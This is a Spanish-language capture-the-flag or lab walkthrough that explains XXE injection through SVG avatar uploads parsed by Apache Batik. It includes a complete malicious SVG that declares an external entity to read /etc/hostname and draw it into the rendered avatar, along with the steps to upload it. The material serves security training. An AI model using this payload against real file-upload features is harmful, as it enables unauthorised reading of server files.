# 🗄️ XXE vía subida de imagen (SVG)

## 📄 Descripción del laboratorio

Este laboratorio permite a los usuarios subir avatares en los comentarios. Entre los formatos aceptados se encuentra **SVG**, que no es una imagen binaria tradicional, sino un documento **XML válido**.

El backend procesa estos archivos SVG utilizando **Apache Batik**, una librería muy común en aplicaciones Java para renderizar gráficos vectoriales.

El problema es que Batik parsea el XML completo, incluyendo **DOCTYPE** y **entidades externas**, lo que convierte la subida de un SVG en un vector clásico de **XXE**.

El objetivo es crear un **SVG malicioso** que lea el archivo:

```
/etc/hostname
```

y muestre su contenido directamente dentro de la imagen renderizada del avatar.



## 📚 Teoría

Un archivo **SVG** no es una imagen binaria, sino **XML puro**. Cuando una aplicación lo procesa con una librería como **Apache Batik**, se parsea el documento XML completo.

Esto implica que:

* Se permite `<!DOCTYPE>`.
* Se resuelven entidades internas y externas.
* Se renderiza el resultado final como imagen.

Si el parser no deshabilita la resolución de entidades externas, podemos declarar una entidad como esta:

```
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

y posteriormente utilizar esa entidad como texto visible dentro del SVG.

La potencia de este vector radica en varios factores:

* SVG suele estar permitido en funcionalidades de subida de archivos.
* Muchos filtros solo validan la extensión del archivo.
* Librerías como Batik no bloquean XXE por defecto.
* La exfiltración no depende de la respuesta HTTP.
* El resultado se observa directamente en la imagen generada.

Es un vector especialmente habitual cuando una aplicación permite subir archivos SVG sin restricciones adicionales.



## 📝 Práctica

### 1️⃣ Preparación del payload

Creamos un archivo llamado `avatar.svg` con el siguiente contenido:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="300" height="200"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <text x="10" y="50" font-size="20">
    &xxe;
  </text>
</svg>
```

En este SVG:

* Se define un `DOCTYPE`.
* Se declara la entidad `xxe`, que apunta al archivo `/etc/hostname`.
* Se inserta `&xxe;` dentro de un elemento `<text>`.

Cuando el SVG sea procesado, el contenido del archivo se dibujará literalmente en la imagen.



### 2️⃣ Subida del SVG

Accedemos a cualquier sección de comentarios del laboratorio y subimos el archivo `avatar.svg` como avatar.

Después publicamos el comentario.

### 3️⃣ Visualización del resultado

Volvemos a la lista de comentarios y localizamos el comentario que acabamos de publicar.

El avatar ya no muestra un icono genérico, sino texto dibujado dentro de la imagen.

Abrimos la imagen en una nueva pestaña o inspeccionamos la URL del avatar.

En la imagen renderizada aparece claramente el contenido del archivo:

```
/etc/hostname
```

Normalmente se mostrará un valor similar a:

```

```
